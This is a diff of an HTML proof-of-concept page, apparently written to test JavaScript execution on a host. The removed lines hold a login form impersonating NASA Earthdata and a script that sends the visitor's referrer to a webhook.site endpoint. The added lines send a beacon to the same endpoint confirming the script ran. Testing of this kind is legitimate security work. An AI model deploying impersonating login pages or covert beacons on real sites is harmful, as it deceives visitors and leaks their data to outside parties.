@@ -1,20 +1,18 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>NASA Login</title>
-</head>
+<head><title>PoC Test</title></head>
 <body>
-  <h2>Secure Earthdata Login</h2>
-  <form>
-    <input type="text" placeholder="Username" /><br><br>
-    <input type="password" placeholder="Password" /><br><br>
-    <button type="submit">Login</button>
-  </form>
+  <h1>JS Execution Check</h1>
+  <div id="status">Waiting...</div>
 
   <script>
-    // Leak referrer to Webhook
-    new Image().src = "https://webhook.site/822a2a98-c688-45d7-adb5-d87d38c30803/ref?ref=" + document.referrer;
+    // تأكيد التنفيذ داخليًا
+    document.getElementById("status").innerText = "✅ JS Executed";
+
+    // إرسال طلب بسيط لتأكيد استلامه
+    fetch("https://webhook.site/822a2a98-c688-45d7-adb5-d87d38c30803?poc=js_executed", {
+      mode: "no-cors"
+    });
   </script>
 </body>
 </html>
